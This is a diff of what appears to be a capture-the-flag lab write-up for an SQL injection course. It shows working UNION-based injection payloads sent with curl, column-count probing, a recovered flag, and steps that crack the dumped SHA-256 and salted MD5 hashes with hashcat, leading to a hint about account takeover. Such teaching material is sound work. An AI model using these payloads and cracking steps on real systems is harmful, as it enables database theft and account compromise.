@@ -36,7 +36,9 @@ curl -s "$B/oauth_callback.php?code=<CODE>"
 curl -sG "$B/search.php" --data-urlencode "q=' UNION SELECT k,v,3 FROM secrets-- -"
 # find columns first:  q=' ORDER BY 3-- -   (ok)   / ORDER BY 4-- - (error)
 ```
-**Result:** `FLAG{un10n_sql1_dumps_the_secrets_table}` + `admin_pw`. **Reason:** `"...name LIKE '%$q%'"`, 3 columns (name,category,price).
+**Result:** `FLAG{un10n_sql1_dumps_the_secrets_table}` + `admin_pw`, plus encoded flags in the same table:
+`flag_b64` (base64), `flag_sha256` (unsalted → `hashcat -m 1400` → `jordan23`), `flag_md5_salted`
+(`hash:salt` → `hashcat -m 10` → `ginger`) — decode/crack each. **Reason:** `"...name LIKE '$q%'"`, 3 columns (name,category,price).
 Deck: SQLi_Course_Labs · SQLi_Exploitation_Methodology.
 
 **Bonus — dump + crack the `users` table** (realistic "SQLi → hash-ID → cracking → account takeover").
